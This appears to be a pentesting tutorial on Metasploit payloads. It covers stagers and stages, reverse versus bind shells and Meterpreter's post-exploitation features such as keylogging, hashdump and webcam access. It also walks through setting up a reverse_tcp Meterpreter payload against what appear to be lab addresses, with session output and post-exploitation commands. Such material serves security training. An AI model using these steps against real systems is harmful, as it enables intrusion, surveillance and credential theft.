# 💣 What is a Payload?

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://silviavali.github.io/assets/img/SLAE/bindreverse.png)

![Image](https://miro.medium.com/1%2AHTc0-Bfv6fgm8yTHHQOgGw.png)

A **Payload** in Metasploit is a module that works **together with an exploit** to:

- Execute code on the target system
    
- Establish a connection back to the attacker
    
- Provide access (shell / control)
    

👉 Simple understanding:

- **Exploit = breaks in**
    
- **Payload = gives control**
    

The payload is delivered **after exploitation** and is responsible for creating a **foothold** on the target system.

---

# ⚙️ Types of Payloads

There are **three main types** of payloads in Metasploit:

---

## 1️⃣ Single Payloads (Inline)

- Self-contained
    
- Includes entire shellcode
    
- Executes immediately
    

### Example:

```text
windows/shell_bind_tcp
```

### Characteristics:

✔ Stable  
✔ No additional download required  
❌ Large size

👉 Used when:

- Simplicity is needed
    
- Exploit supports large payload size
    

---

## 2️⃣ Stagers

- Small payloads
    
- Establish connection first
    
- Prepare channel for full payload
    

### Role:

- Connect back to attacker
    
- Setup communication
    

### Example:

```text
reverse_tcp
```

---

### ⚠️ Windows NX vs NO-NX Stagers

- NX (No Execute) systems require special handling
    
- NX stagers are larger (use VirtualAlloc)
    
- Default: NX + Windows 7 compatible
    

---

## 3️⃣ Stages

- Delivered after stager
    
- Provide full functionality
    

Examples:

- Meterpreter
    
- VNC Injection
    
- Advanced shells
    

---

# 🔗 Staged Payload Concept

A **staged payload** is split into parts:

### Stage 0 (Stager)

- Sent first
    
- Creates connection
    

### Stage 1 (Stage)

- Sent after connection
    
- Provides full control
    

---

### Common Stage0 Types

```text
reverse_tcp
reverse_https
bind_tcp
```

---

# 🔁 Reverse vs Bind Connections

|Type|Description|
|---|---|
|Reverse|Target connects back to attacker|
|Bind|Attacker connects to target|

👉 Reverse shells are preferred because:

✔ Bypass firewall restrictions  
✔ Use outbound traffic (trusted zone)  
✔ More reliable in real-world scenarios

---

# 🚀 Meterpreter Payload

![Image](https://docs.rapid7.com/images/metasploit/meterpreter_pro.png)

![Image](https://docs.rapid7.com/images/metasploit/m_shell_commands.png)

![Image](https://media.springernature.com/lw685/springer-static/image/art%3A10.1007%2Fs10207-024-00836-w/MediaObjects/10207_2024_836_Fig2_HTML.png)

![Image](https://media.springernature.com/lw685/springer-static/image/art%3A10.1007%2Fs10207-024-00836-w/MediaObjects/10207_2024_836_Fig5_HTML.png)

**Meterpreter** is one of the most powerful payloads.

### Features:

- Runs in memory (no disk traces)
    
- Uses DLL injection
    
- Hard to detect
    
- Highly flexible
    

### Capabilities:

- Keylogging
    
- Password dumping
    
- Screenshot capture
    
- Webcam access
    
- Process manipulation
    
- Token impersonation
    

👉 Meterpreter creates a **session** after exploitation.

---

# 🧠 Meterpreter Example

```bash
meterpreter > getuid
```

Output:

```text
NT AUTHORITY\SYSTEM
```

---

# 🔎 Listing Payloads

To view available payloads:

```bash
show payloads
```

Metasploit contains **hundreds of payloads**.

---

# ⚡ Searching Payloads Efficiently

Use `grep` to filter results.

### Example:

```bash
grep meterpreter show payloads
```

Count results:

```bash
grep -c meterpreter show payloads
```

---

### Filter further:

```bash
grep meterpreter grep reverse_tcp show payloads
```

Result:

```text
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp_rc4
windows/x64/meterpreter/reverse_tcp_uuid
```

---

# 🎯 Selecting Payload

After choosing an exploit:

```bash
set payload 15
```

Example:

```text
windows/x64/meterpreter/reverse_tcp
```

---

# ⚙️ Payload Options

After selecting payload:

```bash
show options
```

New parameters appear:

|Parameter|Description|
|---|---|
|LHOST|Attacker IP|
|LPORT|Listening port|

---

# 🌐 Configuring Payload

### Step 1: Check IP

```bash
ifconfig
```

---

### Step 2: Set attacker IP

```bash
set LHOST 10.10.14.15
```

---

### Step 3: Set target IP

```bash
set RHOSTS 10.10.10.40
```

---

# 🚀 Running Exploit with Payload

```bash
run
```

Example output:

```text
[*] Started reverse TCP handler
[+] Target is vulnerable
[*] Sending stage
[*] Meterpreter session opened
```

👉 Notice:

```text
Sending stage (201283 bytes)
```

This confirms a **staged payload execution**.

---

# 💻 Meterpreter Interaction

### Example commands:

```bash
meterpreter > help
meterpreter > ls
meterpreter > cd Users
meterpreter > screenshot
```

---

# 🔄 Switching to Windows Shell

```bash
meterpreter > shell
```

Output:

```text
C:\Users>
```

---

# 👤 Checking Privileges

```bash
whoami
```

Output:

```text
nt authority\system
```

---

# 📂 Meterpreter Capabilities

### File System

- ls, cd, download, upload
    

### Networking

- netstat, portfwd
    

### System

- ps, reboot, sysinfo
    

### User Interface

- screenshot, keylogger
    

### Privilege Escalation

- getsystem
    
- hashdump
    

---

# 🧩 Common Payload Types

|Payload|Description|
|---|---|
|generic/shell_reverse_tcp|Basic reverse shell|
|windows/x64/exec|Execute command|
|windows/x64/meterpreter|Advanced control|
|windows/x64/powershell|PowerShell session|
|windows/x64/vncinject|GUI remote control|

---

# 📌 Key Takeaways

✔ Payload = **post-exploitation access mechanism**  
✔ Three types:

- Single
    
- Stager
    
- Stage
    

✔ Reverse shells are more effective than bind shells  
✔ Meterpreter is the most powerful payload  
✔ Use `grep` to filter payloads efficiently  
✔ Always configure:

- LHOST
    
- LPORT
    

---

# 💡 Pro Tip for Pentesting

> Always choose payload based on:

- Network restrictions
    
- Target OS
    
- Stealth requirements
    

---

# 🔥 Final Insight

Metasploit payloads are powerful, but:

- Wrong payload = failed exploit
    
- Wrong configuration = no session
    

👉 Success depends on:

```text
Correct Exploit + Correct Payload + Correct Target = Successful Attack
```

---
